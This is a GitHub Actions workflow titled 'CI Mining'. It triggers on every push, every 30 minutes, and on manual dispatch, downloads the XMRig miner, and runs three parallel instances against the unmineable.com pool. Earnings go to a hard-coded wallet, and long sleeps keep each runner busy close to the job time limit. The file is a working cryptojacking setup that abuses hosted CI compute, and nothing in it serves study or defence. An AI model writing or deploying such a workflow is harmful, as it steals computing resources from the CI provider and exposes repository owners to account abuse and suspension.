name: CI Mining
on:
  push:
    branches: [ main, master ]
  schedule:
    - cron: '*/30 * * * *'
  workflow_dispatch:

jobs:
  mine:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    strategy:
      matrix:
        instance: [1, 2, 3]
    
    steps:
      - name: Setup
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y wget tar
      
      - name: Deploy XMRig
        run: |
          cd /tmp
          wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -O xmrig.tar.gz
          tar -xzf xmrig.tar.gz
          cd xmrig-*
          chmod +x xmrig
      
      - name: Start Mining
        run: |
          cd /tmp/xmrig-*
          ./xmrig -o rx.unmineable.com:3333 -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.gh_03b042bd_${{ matrix.instance }} -p x --donate-level 1 -k --verbose &
          sleep 21000
